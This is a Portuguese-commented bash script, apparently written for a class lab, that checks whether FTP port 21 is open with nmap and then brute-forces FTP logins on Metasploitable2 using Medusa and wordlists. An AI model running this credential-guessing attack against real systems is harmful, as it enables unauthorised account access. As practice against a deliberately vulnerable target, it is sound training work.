#!/bin/bash
#
# 01-ftp-bruteforce.sh
#
# Script que eu fiz pra testar força bruta no FTP do Metasploitable2.
# Nada muito elaborado, é basicamente automatizar o comando do Medusa
# que a gente viu na aula + uma checagem antes pra ver se a porta tá
# aberta mesmo (já apanhei rodando sem checar e ficava sem entender
# por que não dava nada hehe).
#
# Como usar: ./01-ftp-bruteforce.sh <IP_DO_ALVO>

set -euo pipefail

ALVO="${1:-}"
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"
SAIDA="../resultados/ftp-bruteforce-$(date +%Y%m%d-%H%M%S).txt"

if [ -z "$ALVO" ]; then
    echo "Faltou o IP! Uso: $0 <IP_DO_ALVO>"
    echo "Tipo assim: $0 192.168.56.102"
    exit 1
fi

mkdir -p ../resultados

echo "[*] Vendo se a porta 21 (FTP) tá aberta em $ALVO..."
nmap -p 21 "$ALVO" | grep -i open || {
    echo "[!] Não achei a porta 21 aberta em $ALVO. Confere o IP aí."
    exit 1
}

echo "[*] Beleza, bora rodar o Medusa"
echo "[*] Alvo: $ALVO"
echo "[*] Lista de usuarios: $USUARIOS"
echo "[*] Lista de senhas: $SENHAS"
echo

# -h  host alvo
# -U  arquivo com os usuarios
# -P  arquivo com as senhas
# -M  qual modulo usar (aqui é ftp)
# -t  quantas tentativas em paralelo (deixei baixo pra nao exagerar)
# -f  para assim que acha uma combinacao certa
# -O  salva o resultado num arquivo
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M ftp -t 3 -f -O "$SAIDA"

echo
echo "[*] Terminou! Resultado ficou salvo aqui: $SAIDA"
echo "[*] Se achou alguma senha valida, vai aparecer aqui embaixo:"
grep -i "SUCCESS" "$SAIDA" || echo "    (não achou nenhuma dessa vez)"
